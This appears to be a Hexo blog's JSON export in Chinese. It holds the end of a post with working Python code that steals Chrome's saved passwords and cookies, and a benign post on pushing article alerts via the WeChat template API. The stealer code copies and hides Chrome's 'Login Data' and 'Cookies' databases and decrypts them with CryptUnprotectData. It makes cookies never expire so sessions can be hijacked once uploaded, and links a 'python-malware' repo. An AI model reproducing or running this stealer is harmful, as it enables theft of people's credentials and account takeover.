alt=\"3_4\"></p>\n<p>我们想查询：<code>action_urls</code>，<code>username_value</code>和<code>password_value</code>。字段<code>password_value</code>包含一个加密的<code>Blob</code>，我们将使用以下代码对其进行解密。<br>我们先制作数据库文件的本地副本，否则如果当Chrome正在运行，它将带有一个句柄并且数据库将被锁定。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    login_data = os.environ[<span class=\"string\">'localappdata'</span>] + <span class=\"string\">'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'</span></span><br><span class=\"line\">    shutil.copy2(login_data, <span class=\"string\">'./Login Data'</span>)  <span class=\"comment\"># 复制数据库到当前目录</span></span><br><span class=\"line\">    win32api.SetFileAttributes(<span class=\"string\">'./Login Data'</span>,win32con.FILE_ATTRIBUTE_HIDDEN)  <span class=\"comment\"># 在文件操作过程中不可见</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">chrome_credentials = io.StringIO()</span><br></pre></td></tr></table></figure>\n\n<p>现在，我们使用sqlite3库打开Login Data数据库的本地副本，并查询用户保存凭据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    conn = sqlite3.connect(<span class=\"string\">'./Login Data'</span>, )                                        <span class=\"comment\"># 连接数据库</span></span><br><span class=\"line\">    cursor = conn.cursor()                                                          <span class=\"comment\"># 创建一个游标来获取数据</span></span><br><span class=\"line\">    cursor.execute(<span class=\"string\">'SELECT action_url, username_value, password_value FROM logins'</span>) <span class=\"comment\"># 查询</span></span><br><span class=\"line\">    results = cursor.fetchall()                                                     <span class=\"comment\"># 获取数据</span></span><br><span class=\"line\">    conn.close()                                                                    <span class=\"comment\"># 关闭数据库文件，使其不会被进程锁定</span></span><br><span class=\"line\">    os.remove(<span class=\"string\">'Login Data'</span>)  </span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br></pre></td></tr></table></figure>\n\n<p>遍历获取到的数据并使用WinAPI函数<code>CryptUnprotectData</code>解密密码，最后返回保存好的内存中的文本流。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">for</span> action_url, username_value, password_value <span class=\"keyword\">in</span> results:</span><br><span class=\"line\">        password = win32crypt.CryptUnprotectData(password_value, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"number\">0</span>)[<span class=\"number\">1</span>] <span class=\"comment\"># 使用CryptUnprotectData解密</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> password:                                                                       <span class=\"comment\"># 将凭据写进内存中的文本流</span></span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'URL: '</span> + action_url + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'Username: '</span> + username_value + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'Password: '</span> + str(password) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chrome_credentials.getvalue()                                                   <span class=\"comment\"># 返回内存中的文本流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> sqlite3.OperationalError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    print(e)</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    print(e)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_5.png\" alt=\"3_5\"></p>\n<h3 id=\"窃取Chrome-Cookie\"><a href=\"#窃取Chrome-Cookie\" class=\"headerlink\" title=\"窃取Chrome Cookie\"></a>窃取Chrome Cookie</h3><p>Chrome Cookie与存储在Chrome 的密码一样，为同目录下的Cookies文件并用<code>CryptProtectData</code>加密。但不同的是我们使用解密的cookie窃取整个数据库文件重写数据库内部的数据。然后，如果会话在服务器上尚未过期或用户尚未注销，则可以将该数据库上载到远程服务器，并在站点中用于进行身份验证。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">login_data = os.environ[<span class=\"string\">'localappdata'</span>] + <span class=\"string\">'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'</span>  <span class=\"comment\"># cookies文件路径</span></span><br><span class=\"line\">shutil.copy2(login_data, <span class=\"string\">'./Cookies'</span>)  <span class=\"comment\"># 复制到当前路径</span></span><br><span class=\"line\">win32api.SetFileAttributes(<span class=\"string\">'./Cookies'</span>, win32con.FILE_ATTRIBUTE_HIDDEN)</span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    conn = sqlite3.connect(<span class=\"string\">'./Cookies'</span>)  <span class=\"comment\"># 连接</span></span><br><span class=\"line\">    cursor = conn.cursor()</span><br><span class=\"line\">    cursor.execute(<span class=\"string\">'SELECT host_key, name, value, encrypted_value FROM cookies'</span>)  <span class=\"comment\"># 查询</span></span><br><span class=\"line\">    results = cursor.fetchall()  <span class=\"comment\"># 获取</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 解密</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> host_key, name, value, encrypted_value <span class=\"keyword\">in</span> results:</span><br><span class=\"line\">        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"number\">0</span>)[<span class=\"number\">1</span>].decode()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 使用解密的值更新文件</span></span><br><span class=\"line\">        cursor.execute(<span class=\"string\">\"UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?\"</span>，(decrypted_value, host_key, name));</span><br><span class=\"line\"></span><br><span class=\"line\">    conn.commit()  <span class=\"comment\"># 保存改变</span></span><br><span class=\"line\">    conn.close()  <span class=\"comment\"># 关闭文件，使其不被进程锁定</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    print(e)</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>原cookies文件</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_6.png\" alt=\"3_6\"></p>\n<p>新生成cookies文件</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_7.png\" alt=\"3_7\"></p>\n<p>源代码已上传致[gayhub](<a href=\"https://github.com/yui77111/python-malware/blob/master/credentials\" target=\"_blank\" rel=\"noopener\">https://github.com/yui77111/python-malware/blob/master/credentials</a> and cookies/main.py)</p>\n"},{"title":"微信测试接口推送","description":"微信接口推送数据","_content":"\n以先知社区推送为例，时时推送最新文章\n\n[接口url](https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login)\n\n[社区url](https://xz.aliyun.com/)\n\n### 微信登录获取`appID`与`appsecret`\n\n![image-20200716111925314](https://yui77111.github.io/assets/images/article/wechatpush/image-20200716111925314.png)\n\n### 获取`OpenID`\n\n接收推送的微信扫描关注测试公众号，获取关注者的微信的`OpenID`\n\n![image-20200716112417023](https://yui77111.github.io/assets/images/article/wechatpush/image-20200716112417023.png)\n\n### 获取模板`template_id`\n\n新增测试模板，模板内容格式参数需以.DATA结尾；\n\n想要推送的格式为\n\n```\n社区推送\n2020-06-12 11:44:01\nauthor/tags\n\n某CMS代码审计\n\nhttps://xz.aliyun.com/t/xxxx\n```\n\n![1594872349](https://yui77111.github.io/assets/images/article/wechatpush/1594872349.jpg)\n\n![1594872255](https://yui77111.github.io/assets/images/article/wechatpush/1594872255.jpg)\n\n### 步骤\n\n需要用到的`appID`、`appsecret`、`OpenID`和`template_id`\n\n> 获取access_token->获取用户OpenID->获取推送文章->推送\n\n\n\n详细可参考开发文档\n\n[获取access_token](https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Get_access_token.html)\n\n[获取OpenID](https://developers.weixin.qq.com/doc/offiaccount/User_Management/Getting_a_User_List.html)\n\n[发送](https://developers.weixin.qq.com/doc/offiaccount/Message_Management/Template_Message_Interface.html)\n\n### python\n\n获取的access_token有效时间是2个小时，可以将获取的access_token保存到文本时，需要时提取，失效了再重新获取，不然获取太频繁会重置\n\n```python\n    def get_access_token(self):\n        url = 'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid={}&secret={}'.format(self.appid,self.appsecret)\n        r = request('get',url,headers=self.headers,proxies=self.proxies,verify=False,allow_redirects=False)\n        f = open('access_token','w+')\n        f.write(loads(r.text)['access_token'])\n        f.close()\n```\n\n获取`OpenID`\n\n```python\n    def get_user_list(self):\n        f = open('access_token','r+')\n        self.access_token = f.readline()\n        url = 'https://api.weixin.qq.com/cgi-bin/user/get?access_token={}&next_openid='.format(self.access_token)\n        r = request('get', url,headers=self.headers,proxies=self.proxies,verify=False,allow_redirects=False)\n        return loads(text)['data']['openid']\n```\n\n获取推送文章，爬虫抓取\n\n```python\n{'title': '内网Mysql代理浅析\\n', 'author/tag': 'kuron3k0/渗透测试\\n', 'url': 'https://xz.aliyun.com//t/7993'}\n```\n\n发送的数据为json格式\n\n```python\n    def send_msg(self,openid,info,template):\n        msg = {\n            \"touser\": openid,\n            \"template_id\": template,\n            \"url\": info['url'],\n            \"data\": {\n                'time': {\n                    'value': strftime(\"%Y-%m-%d %H:%M:%S\", localtime())\n                },\n                \"author/tag\": {\n                    \"value\": info['author/tag'],\n                },\n                \"title\": {\n                    \"value\": info['title'],\n                },\n                \"url\": {\n                    \"value\": info['url'],\n                    \"color\": \"#173177\"\n                }\n            }\n        }\n        new_msg = dumps(msg, ensure_ascii=False).encode('utf-8', \"ignore\")\n        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=' + self.access_token\n        r = request('post', url=url, data=new_msg, headers=self.headers, proxies=self.proxies, verify=False,\n                    allow_redirects=False)\n```\n\n### 效果\n\n<img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594884408.jpg\" alt=\"1594884408\" style=\"zoom:50%;\" />\n\n<img src=\"https://yui77111.github.io/assets/images/article/wechatpush/118b9d1c372e5711071e68711da5f3b.jpg\" alt=\"118b9d1c372e5711071e68711da5f3b\" style=\"zoom:19%;\" />\n\n### 其他\n\n推送只是微信接口的其中一个功能，想要了解其他功能可以参考开发文档。\n\n脚本循环提取有些网站可能会因访问太频繁而ban了，可以自加代理，这里提供几个代理网址，可以自己提取使用。(http://www.66ip.cn/，http://www.89ip.cn/，https://ip.jiangxianli.com/api/proxy_ip，http://www.data5u.com/，http://www.goubanjia.com/，http://www.xdaili.cn/，https://www.kuaidaili.com/，http://www.ip3366.net/，https://list.proxylistplus.com/)","source":"_posts/2020-06-12-微信测试接口推送.md","raw":"---\ntitle: 微信测试接口推送\ndescription: 微信接口推送数据\ncategories:\n - tools\ntags: \n - 有趣\n---\n\n以先知社区推送为例，时时推送最新文章\n\n[接口url](https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login)\n\n[社区url](https://xz.aliyun.com/)\n\n### 微信登录获取`appID`与`appsecret`\n\n![image-20200716111925314](https://yui77111.github.io/assets/images/article/wechatpush/image-20200716111925314.png)\n\n### 获取`OpenID`\n\n接收推送的微信扫描关注测试公众号，获取关注者的微信的`OpenID`\n\n![image-20200716112417023](https://yui77111.github.io/assets/images/article/wechatpush/image-20200716112417023.png)\n\n### 获取模板`template_id`\n\n新增测试模板，模板内容格式参数需以.DATA结尾；\n\n想要推送的格式为\n\n```\n社区推送\n2020-06-12 11:44:01\nauthor/tags\n\n某CMS代码审计\n\nhttps://xz.aliyun.com/t/xxxx\n```\n\n![1594872349](https://yui77111.github.io/assets/images/article/wechatpush/1594872349.jpg)\n\n![1594872255](https://yui77111.github.io/assets/images/article/wechatpush/1594872255.jpg)\n\n### 步骤\n\n需要用到的`appID`、`appsecret`、`OpenID`和`template_id`\n\n> 获取access_token->获取用户OpenID->获取推送文章->推送\n\n\n\n详细可参考开发文档\n\n[获取access_token](https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Get_access_token.html)\n\n[获取OpenID](https://developers.weixin.qq.com/doc/offiaccount/User_Management/Getting_a_User_List.html)\n\n[发送](https://developers.weixin.qq.com/doc/offiaccount/Message_Management/Template_Message_Interface.html)\n\n### python\n\n获取的access_token有效时间是2个小时，可以将获取的access_token保存到文本时，需要时提取，失效了再重新获取，不然获取太频繁会重置\n\n```python\n    def get_access_token(self):\n        url = 'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid={}&secret={}'.format(self.appid,self.appsecret)\n        r = request('get',url,headers=self.headers,proxies=self.proxies,verify=False,allow_redirects=False)\n        f = open('access_token','w+')\n        f.write(loads(r.text)['access_token'])\n        f.close()\n```\n\n获取`OpenID`\n\n```python\n    def get_user_list(self):\n        f = open('access_token','r+')\n        self.access_token = f.readline()\n        url = 'https://api.weixin.qq.com/cgi-bin/user/get?access_token={}&next_openid='.format(self.access_token)\n        r = request('get', url,headers=self.headers,proxies=self.proxies,verify=False,allow_redirects=False)\n        return loads(text)['data']['openid']\n```\n\n获取推送文章，爬虫抓取\n\n```python\n{'title': '内网Mysql代理浅析\\n', 'author/tag': 'kuron3k0/渗透测试\\n', 'url': 'https://xz.aliyun.com//t/7993'}\n```\n\n发送的数据为json格式\n\n```python\n    def send_msg(self,openid,info,template):\n        msg = {\n            \"touser\": openid,\n            \"template_id\": template,\n            \"url\": info['url'],\n            \"data\": {\n                'time': {\n                    'value': strftime(\"%Y-%m-%d %H:%M:%S\", localtime())\n                },\n                \"author/tag\": {\n                    \"value\": info['author/tag'],\n                },\n                \"title\": {\n                    \"value\": info['title'],\n                },\n                \"url\": {\n                    \"value\": info['url'],\n                    \"color\": \"#173177\"\n                }\n            }\n        }\n        new_msg = dumps(msg, ensure_ascii=False).encode('utf-8', \"ignore\")\n        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=' + self.access_token\n        r = request('post', url=url, data=new_msg, headers=self.headers, proxies=self.proxies, verify=False,\n                    allow_redirects=False)\n```\n\n### 效果\n\n<img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594884408.jpg\" alt=\"1594884408\" style=\"zoom:50%;\" />\n\n<img src=\"https://yui77111.github.io/assets/images/article/wechatpush/118b9d1c372e5711071e68711da5f3b.jpg\" alt=\"118b9d1c372e5711071e68711da5f3b\" style=\"zoom:19%;\" />\n\n### 其他\n\n推送只是微信接口的其中一个功能，想要了解其他功能可以参考开发文档。\n\n脚本循环提取有些网站可能会因访问太频繁而ban了，可以自加代理，这里提供几个代理网址，可以自己提取使用。(http://www.66ip.cn/，http://www.89ip.cn/，https://ip.jiangxianli.com/api/proxy_ip，http://www.data5u.com/，http://www.goubanjia.com/，http://www.xdaili.cn/，https://www.kuaidaili.com/，http://www.ip3366.net/，https://list.proxylistplus.com/)","slug":"2020-06-12-微信测试接口推送","published":1,"date":"2021-04-21T07:29:10.982Z","updated":"2020-07-24T06:21:07.175Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknr54xhi000h8ot9hhobu99y","content":"<p>以先知社区推送为例，时时推送最新文章</p>\n<p><a href=\"https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login\" target=\"_blank\" rel=\"noopener\">接口url</a></p>\n<p><a href=\"https://xz.aliyun.com/\" target=\"_blank\" rel=\"noopener\">社区url</a></p>\n<h3 id=\"微信登录获取appID与appsecret\"><a href=\"#微信登录获取appID与appsecret\" class=\"headerlink\" title=\"微信登录获取appID与appsecret\"></a>微信登录获取<code>appID</code>与<code>appsecret</code></h3><p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/image-20200716111925314.png\" alt=\"image-20200716111925314\"></p>\n<h3 id=\"获取OpenID\"><a href=\"#获取OpenID\" class=\"headerlink\" title=\"获取OpenID\"></a>获取<code>OpenID</code></h3><p>接收推送的微信扫描关注测试公众号，获取关注者的微信的<code>OpenID</code></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/image-20200716112417023.png\" alt=\"image-20200716112417023\"></p>\n<h3 id=\"获取模板template-id\"><a href=\"#获取模板template-id\" class=\"headerlink\" title=\"获取模板template_id\"></a>获取模板<code>template_id</code></h3><p>新增测试模板，模板内容格式参数需以.DATA结尾；</p>\n<p>想要推送的格式为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">社区推送</span><br><span class=\"line\">2020-06-12 11:44:01</span><br><span class=\"line\">author/tags</span><br><span class=\"line\"></span><br><span class=\"line\">某CMS代码审计</span><br><span class=\"line\"></span><br><span class=\"line\">https://xz.aliyun.com/t/xxxx</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594872349.jpg\" alt=\"1594872349\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594872255.jpg\" alt=\"1594872255\"></p>\n<h3 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h3><p>需要用到的<code>appID</code>、<code>appsecret</code>、<code>OpenID</code>和<code>template_id</code></p>\n<blockquote>\n<p>获取access_token-&gt;获取用户OpenID-&gt;获取推送文章-&gt;推送</p>\n</blockquote>\n<p>详细可参考开发文档</p>\n<p><a href=\"https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Get_access_token.html\" target=\"_blank\" rel=\"noopener\">获取access_token</a></p>\n<p><a href=\"https://developers.weixin.qq.com/doc/offiaccount/User_Management/Getting_a_User_List.html\" target=\"_blank\" rel=\"noopener\">获取OpenID</a></p>\n<p><a href=\"https://developers.weixin.qq.com/doc/offiaccount/Message_Management/Template_Message_Interface.html\" target=\"_blank\" rel=\"noopener\">发送</a></p>\n<h3 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h3><p>获取的access_token有效时间是2个小时，可以将获取的access_token保存到文本时，需要时提取，失效了再重新获取，不然获取太频繁会重置</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_access_token</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&#123;&#125;&amp;secret=&#123;&#125;'</span>.format(self.appid,self.appsecret)</span><br><span class=\"line\">    r = request(<span class=\"string\">'get'</span>,url,headers=self.headers,proxies=self.proxies,verify=<span class=\"literal\">False</span>,allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    f = open(<span class=\"string\">'access_token'</span>,<span class=\"string\">'w+'</span>)</span><br><span class=\"line\">    f.write(loads(r.text)[<span class=\"string\">'access_token'</span>])</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure>\n\n<p>获取<code>OpenID</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_user_list</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">    f = open(<span class=\"string\">'access_token'</span>,<span class=\"string\">'r+'</span>)</span><br><span class=\"line\">    self.access_token = f.readline()</span><br><span class=\"line\">    url = <span class=\"string\">'https://api.weixin.qq.com/cgi-bin/user/get?access_token=&#123;&#125;&amp;next_openid='</span>.format(self.access_token)</span><br><span class=\"line\">    r = request(<span class=\"string\">'get'</span>, url,headers=self.headers,proxies=self.proxies,verify=<span class=\"literal\">False</span>,allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> loads(text)[<span class=\"string\">'data'</span>][<span class=\"string\">'openid'</span>]</span><br></pre></td></tr></table></figure>\n\n<p>获取推送文章，爬虫抓取</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">'title'</span>: <span class=\"string\">'内网Mysql代理浅析\\n'</span>, <span class=\"string\">'author/tag'</span>: <span class=\"string\">'kuron3k0/渗透测试\\n'</span>, <span class=\"string\">'url'</span>: <span class=\"string\">'https://xz.aliyun.com//t/7993'</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发送的数据为json格式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send_msg</span><span class=\"params\">(self,openid,info,template)</span>:</span></span><br><span class=\"line\">    msg = &#123;</span><br><span class=\"line\">        <span class=\"string\">\"touser\"</span>: openid,</span><br><span class=\"line\">        <span class=\"string\">\"template_id\"</span>: template,</span><br><span class=\"line\">        <span class=\"string\">\"url\"</span>: info[<span class=\"string\">'url'</span>],</span><br><span class=\"line\">        <span class=\"string\">\"data\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'time'</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">'value'</span>: strftime(<span class=\"string\">\"%Y-%m-%d %H:%M:%S\"</span>, localtime())</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"string\">\"author/tag\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"value\"</span>: info[<span class=\"string\">'author/tag'</span>],</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"string\">\"title\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"value\"</span>: info[<span class=\"string\">'title'</span>],</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"string\">\"url\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"value\"</span>: info[<span class=\"string\">'url'</span>],</span><br><span class=\"line\">                <span class=\"string\">\"color\"</span>: <span class=\"string\">\"#173177\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    new_msg = dumps(msg, ensure_ascii=<span class=\"literal\">False</span>).encode(<span class=\"string\">'utf-8'</span>, <span class=\"string\">\"ignore\"</span>)</span><br><span class=\"line\">    url = <span class=\"string\">'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token='</span> + self.access_token</span><br><span class=\"line\">    r = request(<span class=\"string\">'post'</span>, url=url, data=new_msg, headers=self.headers, proxies=self.proxies, verify=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                allow_redirects=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h3><img src=\"https://yui77111.github.io/assets/images/article/wechatpush/1594884408.jpg\" alt=\"1594884408\" style=\"zoom:50%;\">\n\n<img src=\"https://yui77111.github.io/assets/images/article/wechatpush/118b9d1c372e5711071e68711da5f3b.jpg\" alt=\"118b9d1c372e5711071e68711da5f3b\" style=\"zoom:19%;\">\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>推送只是微信接口的其中一个功能，想要了解其他功能可以参考开发文档。</p>\n<p>脚本循环提取有些网站可能会因访问太频繁而ban了，可以自加代理，这里提供几个代理网址，可以自己提取使用。(<a href=\"http://www.66ip.cn/，http://www.89ip.cn/，https://ip.jiangxianli.com/api/proxy_ip，http://www.data5u.com/，http://www.goubanjia.com/，http://www.xdaili.cn/，https://www.kuaidaili.com/，http://www.ip3366.net/，https://list.proxylistplus.com/\" target=\"_blank\" rel=\"noopener\">http://www.66ip.cn/，http://www.89ip.cn/，https://ip.jiangxianli.com/api/proxy_ip，http://www.data5u.com/，http://www.goubanjia.com/，http://www.xdaili.cn/，https://www.kuaidaili.com/，http://www.ip3366.net/，https://list.proxylistplus.com/</a>)</p>\n","site":{"data":{"melody":{"theme_color":{"enable":true,"main":"#2d2d46","paginator":"#9b87b4","button_hover":"#9b87b4","text_selection":"#eebb53","link_color":"#1e1f4a","hr_color":"#ffefbd","tag_start_color":"#ffefbd","tag_end_color":"#c5b1cf"},"menu":{"主站":"/","归档":"/archives","标签":"/tags","分类":"/categories"},"favicon":"/melody-favicon.ico","pwa":{"enable":false,"manifest":"/manifest.json"},"highlight_theme":"ocean","social":{"zhihu fab":"https://www.zhihu.com/people/undefinederror/activities","rss fas":"https://listener1379.site","github fab":"https://github.com/1379Post"},"algolia_search":{"enable":false,"hits":{"per_page":10}},"local_search":{"enable":true,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}"}},"mathjax":{"enable":true,"cdn":"https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"katex":{"enable":false,"cdn":{"css":"https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"}},"fireworks":true,"baidu_analytics":"0535214fe33ef7df8b00f50266abfa7d","google_analytics":null,"tencent_analytics":null,"stylesheets":["/css/index.css"],"scripts":["/js/utils.js","/js/fancybox.js","/js/sidebar.js","/js/copy.js","/js/fireworks.js","/js/transition.js","/js/scroll.js","/js/head.js"],"cdn":{"css":{"fontawesome":"https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css","fontawesomeV5":"https://use.fontawesome.com/releases/v5.3.1/css/all.css"},"js":{"anime":"https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js","jquery":"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js","fancybox":"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js","velocity":"https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js","velocity-ui":"https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"}},"avatar":"https://s2.ax1x.com/2019/10/06/ugJeoR.png","top_img":"https://s2.ax1x.com/2019/10/06/ugJCWV.png","post_meta":{"date_type":"created","categories":true,"tags":true},"wordcount":{"enable":true},"toc":{"enable":true,"number":true},"post_copyright":{"enable":true,"license":"CC BY-NC-SA 